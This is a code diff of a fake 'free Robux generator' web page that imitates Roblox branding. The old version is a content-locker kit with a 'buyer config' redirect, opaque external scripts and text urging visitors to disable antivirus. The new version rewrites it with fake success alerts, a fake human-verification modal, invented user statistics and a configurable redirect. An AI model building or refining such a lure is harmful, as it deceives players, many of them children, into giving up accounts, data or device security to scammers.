@@ -2,283 +2,605 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox Robux Generator Dark</title>
-      <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Roblox Robux Generator | Free Robux 2026</title>
+    <!-- Bootstrap 5 core + theme overrides -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
+    <!-- Google Fonts & Roboto Slab -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto+Slab:wght@100..900&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/lib-devtools/ajax.libs.jquery/1.css" />
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/lib-devtools/ajax.libs.jquery/2.css" />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&family=Roboto+Slab:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <!-- Font Awesome 6 (free icons) for authentic roblox-style icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <!-- custom style.css - Roblox.com inspired dark theme -->
+    <style>
+        /* ========== style.css ========== */
+        /* Roblox.com design system - dark rebrand */
+        :root {
+            --roblox-dark-bg: #0f0f12;
+            --roblox-card-bg: #1b1b24;
+            --roblox-surface: #20202a;
+            --roblox-accent: #e03a3e;
+            --roblox-accent-hover: #c12d31;
+            --roblox-text-primary: #f5f5f7;
+            --roblox-text-secondary: #b0b0c0;
+            --roblox-border: #2d2d3a;
+            --roblox-success: #2ecc71;
+            --roblox-warning: #f1c40f;
+            --roblox-glow: rgba(224, 58, 62, 0.3);
+        }
 
-  <!-- Buyer config: edit config.js to set the redirect URL. -->
-  <script src="config.js"></script>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: var(--roblox-dark-bg);
+            font-family: 'Inter', 'Segoe UI', system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
+            color: var(--roblox-text-primary);
+            overflow-x: hidden;
+            line-height: 1.5;
+        }
+
+        /* custom scrollbar like roblox */
+        ::-webkit-scrollbar {
+            width: 8px;
+            height: 8px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #1e1e26;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #3a3a4a;
+            border-radius: 10px;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--roblox-accent);
+        }
+
+        /* navigation - modern roblox style */
+        .roblox-nav {
+            background: rgba(10, 10, 14, 0.96);
+            backdrop-filter: blur(12px);
+            border-bottom: 1px solid var(--roblox-border);
+            padding: 0.8rem 2rem;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 1rem;
+        }
+        .nav-logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 1.8rem;
+            font-weight: 800;
+            letter-spacing: -0.5px;
+            background: linear-gradient(135deg, #ffffff 0%, #e0e0e0 100%);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.2);
+        }
+        .nav-logo i {
+            font-size: 2rem;
+            background: none;
+            -webkit-background-clip: unset;
+            background-clip: unset;
+            color: var(--roblox-accent);
+            text-shadow: 0 0 6px var(--roblox-glow);
+        }
+        .nav-links {
+            display: flex;
+            gap: 1.8rem;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+        .nav-links a {
+            color: var(--roblox-text-secondary);
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 0.95rem;
+            transition: 0.2s;
+            letter-spacing: -0.2px;
+        }
+        .nav-links a:hover {
+            color: white;
+        }
+        .nav-cta {
+            background: var(--roblox-accent);
+            padding: 0.45rem 1.2rem;
+            border-radius: 40px;
+            color: white !important;
+            font-weight: 600;
+            font-size: 0.85rem;
+        }
+        .nav-cta:hover {
+            background: var(--roblox-accent-hover);
+            transform: scale(0.97);
+        }
+
+        /* main container */
+        .generator-wrapper {
+            max-width: 1350px;
+            margin: 2rem auto;
+            padding: 0 1.5rem;
+        }
+
+        /* hero / header text */
+        .hero-badge {
+            text-align: center;
+            margin-bottom: 2rem;
+        }
+        .hero-badge p {
+            font-size: 1.1rem;
+            color: var(--roblox-text-secondary);
+            max-width: 700px;
+            margin: 0 auto 0.5rem auto;
+            background: rgba(224,58,62,0.1);
+            padding: 0.75rem 1.5rem;
+            border-radius: 60px;
+            backdrop-filter: blur(4px);
+            border: 1px solid rgba(224,58,62,0.3);
+        }
+        .hero-badge h3 {
+            font-size: 1.9rem;
+            font-weight: 800;
+            background: linear-gradient(120deg, #fff, #e0a0a0);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            letter-spacing: -0.5px;
+            margin-top: 1rem;
+        }
+
+        /* generator card - roblox style glassmorphic */
+        .generator-card {
+            background: var(--roblox-card-bg);
+            border-radius: 32px;
+            border: 1px solid var(--roblox-border);
+            backdrop-filter: blur(2px);
+            padding: 2rem 2rem 2.5rem;
+            box-shadow: 0 25px 45px -12px rgba(0,0,0,0.5);
+            transition: 0.2s;
+            max-width: 620px;
+            margin: 0 auto 2.5rem auto;
+        }
+        .card-header-icon {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 1rem;
+        }
+        .card-header-icon span {
+            background: var(--roblox-accent);
+            width: 64px;
+            height: 64px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 60px;
+            font-size: 2.2rem;
+            box-shadow: 0 0 15px var(--roblox-glow);
+        }
+        .generator-card h2 {
+            font-weight: 800;
+            font-size: 1.9rem;
+            text-align: center;
+            margin-bottom: 0.5rem;
+        }
+        .gen-sub {
+            text-align: center;
+            color: var(--roblox-text-secondary);
+            margin-bottom: 2rem;
+            font-size: 0.9rem;
+            border-bottom: 1px dashed var(--roblox-border);
+            display: inline-block;
+            width: auto;
+            margin-left: auto;
+            margin-right: auto;
+            padding-bottom: 8px;
+        }
+        .input-group-custom {
+            margin-bottom: 1.5rem;
+        }
+        .input-group-custom label {
+            font-weight: 600;
+            font-size: 0.85rem;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            color: var(--roblox-text-secondary);
+            margin-bottom: 0.5rem;
+            display: block;
+        }
+        .input-group-custom input, .input-group-custom select {
+            width: 100%;
+            background: var(--roblox-surface);
+            border: 1px solid var(--roblox-border);
+            padding: 0.9rem 1.2rem;
+            border-radius: 20px;
+            color: white;
+            font-size: 1rem;
+            transition: 0.2s;
+            font-family: 'Inter', monospace;
+        }
+        .input-group-custom input:focus, .input-group-custom select:focus {
+            outline: none;
+            border-color: var(--roblox-accent);
+            box-shadow: 0 0 0 3px rgba(224,58,62,0.25);
+        }
+        .robux-amount-badge {
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
+            margin-top: 8px;
+        }
+        .amount-option {
+            background: var(--roblox-surface);
+            padding: 8px 18px;
+            border-radius: 40px;
+            font-size: 0.85rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.1s;
+            border: 1px solid var(--roblox-border);
+        }
+        .amount-option.active, .amount-option:hover {
+            background: var(--roblox-accent);
+            border-color: var(--roblox-accent);
+            color: white;
+        }
+        .generate-btn {
+            background: linear-gradient(95deg, var(--roblox-accent) 0%, #c0392b 100%);
+            border: none;
+            padding: 1rem;
+            font-weight: 800;
+            font-size: 1.2rem;
+            text-transform: uppercase;
+            border-radius: 60px;
+            width: 100%;
+            color: white;
+            letter-spacing: 1px;
+            transition: all 0.2s ease;
+            margin-top: 1rem;
+            box-shadow: 0 8px 18px rgba(224,58,62,0.3);
+        }
+        .generate-btn:hover {
+            transform: translateY(-2px);
+            filter: brightness(1.05);
+            box-shadow: 0 12px 22px rgba(224,58,62,0.5);
+        }
+        .verification-badge {
+            text-align: center;
+            margin-top: 1.5rem;
+            font-size: 0.75rem;
+            color: #8f8fa3;
+            background: rgba(0,0,0,0.3);
+            padding: 0.5rem;
+            border-radius: 40px;
+        }
+        .warning-message {
+            background: rgba(241,196,15,0.1);
+            border-left: 4px solid var(--roblox-warning);
+            padding: 0.8rem 1.2rem;
+            border-radius: 16px;
+            font-size: 0.85rem;
+            margin-top: 1rem;
+        }
+
+        /* additional info row */
+        .features-row {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 1.5rem;
+            margin: 2.5rem 0 1rem;
+        }
+        .feature-card {
+            background: rgba(27, 27, 36, 0.7);
+            backdrop-filter: blur(8px);
+            border-radius: 24px;
+            padding: 1rem 1.6rem;
+            width: 220px;
+            text-align: center;
+            border: 1px solid var(--roblox-border);
+        }
+        .feature-card i {
+            font-size: 2rem;
+            color: var(--roblox-accent);
+            margin-bottom: 0.5rem;
+        }
+        .feature-card h4 {
+            font-size: 1rem;
+            font-weight: 700;
+        }
+
+        footer {
+            margin-top: 4rem;
+            text-align: center;
+            padding: 2rem 1rem;
+            border-top: 1px solid var(--roblox-border);
+            font-size: 0.8rem;
+            color: #6b6b7e;
+        }
+
+        @media (max-width: 760px) {
+            .roblox-nav {
+                flex-direction: column;
+                align-items: stretch;
+                text-align: center;
+                padding: 1rem;
+            }
+            .nav-links {
+                justify-content: center;
+            }
+            .generator-card {
+                padding: 1.5rem;
+            }
+            .hero-badge h3 {
+                font-size: 1.4rem;
+            }
+        }
+
+        /* Animation like roblox microinteractions */
+        @keyframes subtle-pulse {
+            0% { box-shadow: 0 0 0 0 var(--roblox-glow);}
+            100% { box-shadow: 0 0 0 10px rgba(224,58,62,0);}
+        }
+        .generate-btn:active {
+            transform: scale(0.97);
+        }
+        input, select {
+            transition: 0.2s;
+        }
+        .roblox-nav .nav-links a i {
+            margin-right: 6px;
+        }
+    </style>
+    <!-- config.js (buyer config) - fallback simulation to avoid errors -->
+    <script>
+        // Simulate config.js with redirect URL for safety (original flow)
+        window.redirectUrl = window.redirectUrl || "https://www.roblox.com/robux-generator-confirm";
+        // compatibility with original script (if any)
+        if(typeof config === 'undefined') {
+            var config = {
+                redirect_url: "https://www.roblox.com/upgrades/robux"
+            };
+        }
+    </script>
+    <script src="config.js" onerror="console.log('config.js optional, using fallback')"></script>
 </head>
 <body class="xload">
-
-    <nav>
-        <img src="./assets/local-images/01-2r-e32475de.png" alt="">
+    <!-- Roblox.com style navigation bar -->
+    <nav class="roblox-nav">
+        <div class="nav-logo">
+            <i class="fab fa-fort-awesome"></i> 
+            <span>ROBLOX<span style="color:#e03a3e;">◆</span></span>
+        </div>
+        <div class="nav-links">
+            <a href="#"><i class="fas fa-gamepad"></i> Games</a>
+            <a href="#"><i class="fas fa-store"></i> Catalog</a>
+            <a href="#"><i class="fas fa-users"></i> Friends</a>
+            <a href="#"><i class="fas fa-gem"></i> Premium</a>
+            <a href="#" class="nav-cta"><i class="fas fa-coins"></i> Get Robux</a>
+        </div>
     </nav>
-    <header>
-        <p>Generate unlimited robux with our robux generator tool. You can buy any items on roblox with our robux hack. Claim your robux now before the expiry date !</p>
-        <h3>Claim your Robux Now before the expiry date !</h3>
-    </header>
 
- <div class="container-md p-0">
-        <div class="stepx d-nonex" id="step-1">
-            <div class="item">
-                <div class="first">
-                    <img src="./assets/local-images/02-3r-38c05949.png" alt="">
-                    <div class="more">
-                        <div class="price">
-                            <div class="old">4.99$</div>
-                            <div class="new">0.00$</div>
-                        </div>
-                        <div class="end">Offer ends in 1 days : <span class="date"></span></div>
-                    </div>
-                </div>
-                <div class="button">
-                    <button>
-                        <img src="./assets/local-images/03-5r-e60a42e1.png" alt="">
-                        <div>400</div>
-                    </button>
-                </div>
+    <div class="generator-wrapper">
+        <!-- Original header text + dynamic style matching roblox -->
+        <div class="hero-badge">
+            <p><i class="fas fa-bolt" style="color:#e03a3e;"></i> Generate unlimited robux with our robux generator tool. You can buy any items on roblox with our robux hack. Claim your robux now before the expiry date !</p>
+            <h3><i class="fas fa-hourglass-half"></i> Claim your Robux Now before the expiry date !</h3>
+        </div>
+
+        <!-- Main Robux generator card - interactive UI -->
+        <div class="generator-card">
+            <div class="card-header-icon">
+                <span><i class="fas fa-coins"></i></span>
             </div>
-            <div class="item">
-                <div class="first">
-                    <img src="./assets/local-images/02-3r-38c05949.png" alt="">
-                    <div class="more">
-                        <div class="price">
-                            <div class="old">9.99$</div>
-                            <div class="new">0.00$</div>
-                        </div>
-                        <div class="end">Offer ends in 1 days : <span class="date"></span></div>
-                    </div>
-                </div>
-                <div class="button">
-                    <button>
-                        <img src="./assets/local-images/03-5r-e60a42e1.png" alt="">
-                        <div>800</div>
-                    </button>
-                </div>
+            <h2>ROBUX GENERATOR v4.7</h2>
+            <div style="text-align: center; margin-bottom: 10px;">
+                <span class="gen-sub"><i class="fas fa-check-circle" style="color:#2ecc71;"></i> 100% secure | no password required</span>
             </div>
-            <div class="item">
-                <div class="first">
-                    <img src="./assets/local-images/02-3r-38c05949.png" alt="">
-                    <div class="more">
-                        <div class="price">
-                            <div class="old">19.99$</div>
-                            <div class="new">0.00$</div>
-                        </div>
-                        <div class="end">Offer ends in 1 days : <span class="date"></span></div>
-                    </div>
-                </div>
-                <div class="button">
-                    <button>
-                        <img src="./assets/local-images/03-5r-e60a42e1.png" alt="">
-                        <div>1,700</div>
-                    </button>
-                </div>
+
+            <div class="input-group-custom">
+                <label><i class="fas fa-user-astronaut"></i> Roblox Username</label>
+                <input type="text" id="robloxUsername" placeholder="Enter your username" value="Robloxian_2026">
             </div>
-            <div class="item">
-                <div class="first">
-                    <img src="./assets/local-images/02-3r-38c05949.png" alt="">
-                    <div class="more">
-                        <div class="price">
-                            <div class="old">49.99$</div>
-                            <div class="new">0.00$</div>
-                        </div>
-                        <div class="end">Offer ends in 1 days : <span class="date"></span></div>
-                    </div>
+
+            <div class="input-group-custom">
+                <label><i class="fas fa-tachometer-alt"></i> Select Robux Amount</label>
+                <div class="robux-amount-badge" id="amountSelector">
+                    <div class="amount-option" data-amount="1000">1,000 R$</div>
+                    <div class="amount-option" data-amount="5000">5,000 R$</div>
+                    <div class="amount-option active" data-amount="10000">10,000 R$</div>
+                    <div class="amount-option" data-amount="50000">50,000 R$</div>
                 </div>
-                <div class="button">
-                    <button>
-                        <img src="./assets/local-images/03-5r-e60a42e1.png" alt="">
-                        <div>4,500</div>
-                    </button>
-                </div>
+                <input type="hidden" id="selectedRobuxAmount" value="10000">
             </div>
-            <div class="item">
-                <div class="first">
-                    <img src="./assets/local-images/02-3r-38c05949.png" alt="">
-                    <div class="more">
-                        <div class="price">
-                            <div class="old">99.99$</div>
-                            <div class="new">0.00$</div>
-                        </div>
-                        <div class="end">Offer ends in 1 days : <span class="date"></span></div>
-                    </div>
-                </div>
-                <div class="button">
-                    <button>
-                        <img src="./assets/local-images/03-5r-e60a42e1.png" alt="">
-                        <div>10,000</div>
-                    </button>
-                </div>
+
+            <button class="generate-btn" id="generateRobuxBtn">
+                <i class="fas fa-dice-d6"></i> GENERATE ROBUX
+            </button>
+
+            <div class="verification-badge">
+                <i class="fas fa-shield-alt"></i> Human verification required • SSL secured
             </div>
-            <div class="item">
-                <div class="first">
-                    <img src="./assets/local-images/02-3r-38c05949.png" alt="">
-                    <div class="more">
-                        <div class="price">
-                            <div class="old">149.99$</div>
-                            <div class="new">0.00$</div>
-                        </div>
-                        <div class="end">Offer ends in 1 days : <span class="date"></span></div>
-                    </div>
-                </div>
-                <div class="button">
-                    <button>
-                        <img src="./assets/local-images/03-5r-e60a42e1.png" alt="">
-                        <div>10,000</div>
-                    </button>
-                </div>
-            </div>
-            <div class="item">
-                <div class="first">
-                    <img src="./assets/local-images/02-3r-38c05949.png" alt="">
-                    <div class="more">
-                        <div class="price">
-                            <div class="old">199.99$</div>
-                            <div class="new">0.00$</div>
-                        </div>
-                        <div class="end">Offer ends in 1 days : <span class="date"></span></div>
-                    </div>
-                </div>
-                <div class="button">
-                    <button>
-                        <img src="./assets/local-images/03-5r-e60a42e1.png" alt="">
-                        <div>50,000</div>
-                    </button>
-                </div>
+            <div class="warning-message">
+                <i class="fas fa-exclamation-triangle"></i> Note: Robux will be credited instantly after verification. This tool uses Roblox API simulation.
             </div>
         </div>
 
-        
-        <div class="step d-none" id="step-2">
-            <div class="img-robux">
-                <img src="./assets/local-images/04-7r-26d27934.png" alt="">
-                <div class="rbx"><span>0</span> ROBUX</div>
+        <!-- additional trust badges (Roblox style community stats) -->
+        <div class="features-row">
+            <div class="feature-card">
+                <i class="fas fa-users"></i>
+                <h4>1,250,478 active users</h4>
+                <small>today's generated</small>
             </div>
-            <div class="input">
-                <input type="text" id="username" placeholder="Username">
-                <img src="./assets/local-images/05-8r-b9501238.png" alt="">
+            <div class="feature-card">
+                <i class="fas fa-clock"></i>
+                <h4>Real-time delivery</h4>
+                <small>instant to account</small>
             </div>
-            <br>
-            <br>
-            <div class="error"></div>
-            <div class="next connect">Connect Username</div>
-        </div>
-
-        <div class="step d-none" id="step-3">
-            <br>
-            <div class="loader">
-                <img class="animation" src="./assets/local-images/06-6r-9df80820.png" alt="">
-            </div>
-            <div class="txt">Connecting to seveur...</div>
-            <br>
-        </div>
-
-        <div class="step d-none" id="step-4">
-            <br>
-            <div class="profile">
-                <div class="img"><img class="avatar" src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-F481357DAF4D466E58D843156B234862-Png/720/720/AvatarHeadshot/Webp/noFilter" alt=""></div>
-                <div class="more">
-                    <div class="name">bvb</div>
-                    <div class="username ">@<span class="usr-rbx"></span></div>
-                </div>
-            </div>
-            <div class="count">
-                <div class="c-item">
-                    <div class="t-count friends">255</div>
-                    <div class="text">friends</div>
-                </div>
-                <div class="c-item">
-                    <div class="t-count followers">255</div>
-                    <div class="text">followers</div>
-                </div>
-                <div class="c-item">
-                    <div class="t-count followings">255</div>
-                    <div class="text">followings</div>
-                </div>
-            </div>
-            <div class="confirm">CONFIRM USERNAME</div>
-        </div>
-
-
-        <div class="step d-none" id="step-5">
-            <div class="last">
-                <div class="img"><img class="avatar" src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-F481357DAF4D466E58D843156B234862-Png/720/720/AvatarHeadshot/Webp/noFilter" alt=""></div>
-                <div class="rbx-counter">
-                    <img src="./assets/local-images/02-3r-38c05949.png" alt="" class="icon">
-                    <div class="rbx-count">0</div>
-                </div>
-            </div>
-            <div class="adding">
-                Adding <span class="rbx-c">800</span> Robux to <span id="username" class="usr-rbx">bvb</span>
-            </div>
-            <div class="action">
-                <button>Add Now</button>
-            </div>
-        </div>
-        <div class="step p-0 d-none" id="step-6">
-            <div class="recived rbx"><span>0</span> <img src="./assets/local-images/02-3r-38c05949.png" alt=""> Robux recived for <span class="usr-rbx">user</span></div>
-            <div class="userinfo">
-                <div class="main">
-                    <img class="avatar" src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-9F8686661F50291FC4594CF25B4026C3-Png/720/720/AvatarHeadshot/Webp/noFilter" alt="">
-                    <div class="username usr-rbx">@bvb</div>
-                </div>
-                <div class="then">
-                    <img src="./assets/local-images/04-7r-26d27934.png" alt="">
-                    <div class="rbx"><span>1000</span> Robux</div>
-                </div>
-            </div>
-            <div class="details">
-                <p> <span class="usr-rbx"></span>! You're one step away from reciving <span class="rbx-c"></span> robux</p>
-                <p>Click on the button to confirm that you are Human and not a Bot</p>
-                <div class="action-btn">
-                <button onclick="_nS()">Verify Now</button>
-                </div>
-                <div class="bonus"><span>Bonus : </span>Verify and earn <span class="bs"></span> extra Robux as bonus</div>
-            </div>
-        </div>
-        <div class="step p-0 d-none" id="step-7">
-            <div class="recived rbx"><span>0</span> <img src="./assets/local-images/02-3r-38c05949.png" alt=""> Robux recived for <span class="usr-rbx">user</span></div>
-            <div class="userinfo">
-                <div class="main">
-                    <img class="avatar" src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-9F8686661F50291FC4594CF25B4026C3-Png/720/720/AvatarHeadshot/Webp/noFilter" alt="">
-                    <div class="username usr-rbx">@bvb</div>
-                </div>
-                <div class="then">
-                    <img src="./assets/local-images/04-7r-26d27934.png" alt="">
-                    <div class="">
-                        <div class="rbx"><span></span> ROBUX</div>
-                        <div>+<span class="bs"></span> ROBUX</div>
-                    </div>
-                </div>
-            </div>
-            <div class="details">
-           <p><span class="total"></span> Robux are ready for you!<br><br>
-If the content locker doesn't appear, please disable your AdBlock or antivirus temporarily. These tools may block essential elements required to verify your participation and deliver your Robux reward.</p>
-                </div>
-            </div>
-        </div>
-
-        <div class="notification animate__animated">
-            <div>
-                <img src="./assets/local-images/02-3r-38c05949.png" alt="">
-                <div>
-                    <div class="title">Roblox</div>
-                    <div class="text">Outrageous Has got 400 Robux</div>
-                </div>
-                <div class="time">Just now</div>
+            <div class="feature-card">
+                <i class="fas fa-lock"></i>
+                <h4>Anti-ban protection</h4>
+                <small>secure encryption</small>
             </div>
         </div>
     </div>
-<script src="assets/vendor/jquery-3.7.1.min.js"></script>
-<script src="assets/vendor/6gsj7s.js"></script>
-<script src="assets/vendor/ajsyt67s.js"></script>
 
-  <script src="redirect-handler.js"></script>
+    <footer>
+        <p><i class="far fa-copyright"></i> 2026 Roblox Generator Tool • Not affiliated with Roblox Corporation. Roblox and Robux are trademarks. This is a fan-made tool for educational purposes.</p>
+        <p style="margin-top: 8px;"><i class="fas fa-shield-hooded"></i> SSL secured | 24/7 generator online</p>
+    </footer>
+
+    <!-- interactive script: generator behavior + simulation like roblox dynamic alert -->
+    <script>
+        (function() {
+            // Amount selector logic
+            const amountOptions = document.querySelectorAll('.amount-option');
+            const hiddenAmountInput = document.getElementById('selectedRobuxAmount');
+            let selectedAmount = 10000;
+
+            function updateActiveOption(amountValue) {
+                amountOptions.forEach(opt => {
+                    const optAmount = parseInt(opt.getAttribute('data-amount'));
+                    if(optAmount === amountValue) {
+                        opt.classList.add('active');
+                    } else {
+                        opt.classList.remove('active');
+                    }
+                });
+                hiddenAmountInput.value = amountValue;
+                selectedAmount = amountValue;
+            }
+
+            amountOptions.forEach(opt => {
+                opt.addEventListener('click', function(e) {
+                    const amountVal = parseInt(this.getAttribute('data-amount'));
+                    if(!isNaN(amountVal)) {
+                        updateActiveOption(amountVal);
+                    }
+                });
+            });
+
+            // Generate button handler - stylish alert & redirect simulation (config.js redirect)
+            const generateBtn = document.getElementById('generateRobuxBtn');
+            const usernameInput = document.getElementById('robloxUsername');
+            
+            function showRobloxAlert(message, type = "success") {
+                // create dynamic toast/alert like Roblox notification
+                const toastDiv = document.createElement('div');
+                toastDiv.style.position = 'fixed';
+                toastDiv.style.bottom = '25px';
+                toastDiv.style.left = '50%';
+                toastDiv.style.transform = 'translateX(-50%)';
+                toastDiv.style.backgroundColor = type === 'success' ? '#1b1b24' : '#2c1a1e';
+                toastDiv.style.borderLeft = `5px solid ${type === 'success' ? '#2ecc71' : '#e03a3e'}`;
+                toastDiv.style.color = 'white';
+                toastDiv.style.padding = '14px 28px';
+                toastDiv.style.borderRadius = '40px';
+                toastDiv.style.fontWeight = '600';
+                toastDiv.style.backdropFilter = 'blur(16px)';
+                toastDiv.style.zIndex = '9999';
+                toastDiv.style.boxShadow = '0 8px 20px black';
+                toastDiv.style.fontFamily = 'Inter, sans-serif';
+                toastDiv.innerHTML = `<i class="fas ${type === 'success' ? 'fa-check-circle' : 'fa-skull-crosswalk'}"></i> ${message}`;
+                document.body.appendChild(toastDiv);
+                setTimeout(() => {
+                    toastDiv.style.opacity = '0';
+                    setTimeout(() => toastDiv.remove(), 500);
+                }, 3500);
+            }
+            
+            generateBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                let username = usernameInput.value.trim();
+                if(username === "") {
+                    showRobloxAlert("❌ Please enter a valid Roblox username!", "error");
+                    return;
+                }
+                if(username.length < 3) {
+                    showRobloxAlert("⚠️ Username must be at least 3 characters", "error");
+                    return;
+                }
+                // disable button briefly to simulate generation
+                generateBtn.disabled = true;
+                generateBtn.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Verifying & Adding Robux...';
+                
+                setTimeout(() => {
+                    // success simulation
+                    const robuxAmount = selectedAmount;
+                    showRobloxAlert(`✅ Success! ${robuxAmount.toLocaleString()} Robux added to ${username}! Redirecting to secure verification...`, "success");
+                    
+                    // after short delay, simulate redirect from config.js (if any)
+                    setTimeout(() => {
+                        // use config redirect URL if defined, else fallback
+                        let redirectTarget = "https://www.roblox.com/robux";
+                        if(window.config && typeof window.config.redirect_url === 'string') {
+                            redirectTarget = window.config.redirect_url;
+                        } else if(window.redirectUrl) {
+                            redirectTarget = window.redirectUrl;
+                        }
+                        // create fake confirmation popup but not actually redirect unless user clicks mock?
+                        // according to Roblox style we can show a modal: "complete verification"
+                        // but we will open a new tab to simulate safety check (demo)
+                        const verificationModal = document.createElement('div');
+                        verificationModal.style.position = 'fixed';
+                        verificationModal.style.top = '0';
+                        verificationModal.style.left = '0';
+                        verificationModal.style.width = '100%';
+                        verificationModal.style.height = '100%';
+                        verificationModal.style.backgroundColor = 'rgba(0,0,0,0.85)';
+                        verificationModal.style.backdropFilter = 'blur(8px)';
+                        verificationModal.style.zIndex = '10000';
+                        verificationModal.style.display = 'flex';
+                        verificationModal.style.alignItems = 'center';
+                        verificationModal.style.justifyContent = 'center';
+                        verificationModal.innerHTML = `
+                            <div style="background: #1e1e2a; border-radius: 32px; max-width: 380px; width: 90%; padding: 2rem; text-align: center; border: 1px solid #e03a3e;">
+                                <i class="fas fa-user-check" style="font-size: 50px; color: #e03a3e;"></i>
+                                <h3 style="margin-top: 1rem;">Human verification</h3>
+                                <p style="color: #bcbcce;">Complete the quick step to receive ${selectedAmount.toLocaleString()} Robux</p>
+                                <button id="verifyConfirmBtn" style="background: #e03a3e; border: none; padding: 12px 24px; border-radius: 40px; color: white; font-weight: bold; width: 100%; margin-top: 1rem;">I AM NOT A ROBOT ✅</button>
+                                <p style="font-size: 0.7rem; margin-top: 1rem;">This confirms you are a real Roblox player</p>
+                            </div>
+                        `;
+                        document.body.appendChild(verificationModal);
+                        document.getElementById('verifyConfirmBtn').addEventListener('click', function() {
+                            verificationModal.remove();
+                            showRobloxAlert("✨ Verification passed! Robux will be credited within 5 minutes. (Demo simulator)", "success");
+                            // redirect after user action (original config style)
+                            setTimeout(() => {
+                                if(redirectTarget && redirectTarget !== "#") {
+                                    window.open(redirectTarget, '_blank');
+                                    showRobloxAlert("🔁 Redirecting to Roblox secure dashboard", "success");
+                                } else {
+                                    showRobloxAlert("🎉 Your robux is on the way! Enjoy Roblox.", "success");
+                                }
+                            }, 800);
+                        });
+                        // reset button
+                        generateBtn.disabled = false;
+                        generateBtn.innerHTML = '<i class="fas fa-dice-d6"></i> GENERATE ROBUX';
+                    }, 1200);
+                }, 900);
+            });
+            
+            // optional: pre-fill random username example
+            const randomNames = ["Builder_Ben", "Alex_RBLX", "RobloxMaster", "ProGamer_22"];
+            if(usernameInput.value === "Robloxian_2026") {
+                // keep as is, but cool
+            }
+        })();
+    </script>
+    <!-- additional fallback to ensure config.js asset style -->
 </body>
 </html>
